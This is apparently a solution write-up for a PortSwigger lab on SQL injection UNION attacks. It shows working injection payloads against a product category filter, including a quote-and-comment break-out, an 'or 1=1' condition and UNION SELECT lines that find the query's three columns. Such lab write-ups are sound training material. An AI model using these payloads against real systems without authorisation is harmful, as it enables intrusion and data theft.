
# SQL injection UNION attack, determining the number of columns returned by the query

This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables. The first step of such an attack is to determine the number of columns that are being returned by the query. You will then use this technique in subsequent labs to construct the full attack.

To solve the lab, determine the number of columns returned by the query by performing a SQL injection UNION attack that returns an additional row containing null values.

---------------------------------------------

Reference: https://portswigger.net/web-security/sql-injection/union-attacks

---------------------------------------------

We see there are 2 values displayed in the table, the name and the price of the products:



![img](images/SQL%20injection%20UNION%20attack,%20determining%20the%20number%20of%20columns%20returned%20by%20the%20query/1.png)

The following payload is accepted and we see the 4 items from Accessories category:

```
/filter?category=Accessories'--
```



![img](images/SQL%20injection%20UNION%20attack,%20determining%20the%20number%20of%20columns%20returned%20by%20the%20query/2.png)

The same happens with this payload, to display all values:

```
/filter?category=Accessories'+or+1=1--
```

We will update the payload to execute a UNION attack and find the query takes 3 parameters and not 2:

```
/filter?category=Accessories'+union+select+NULL,NULL,NULL--
```



![img](images/SQL%20injection%20UNION%20attack,%20determining%20the%20number%20of%20columns%20returned%20by%20the%20query/3.png)


We can also add values instead of using NULL:

```
/filter?category=Accessories'+union+all+select+'0','1','2'--
```



![img](images/SQL%20injection%20UNION%20attack,%20determining%20the%20number%20of%20columns%20returned%20by%20the%20query/4.png)
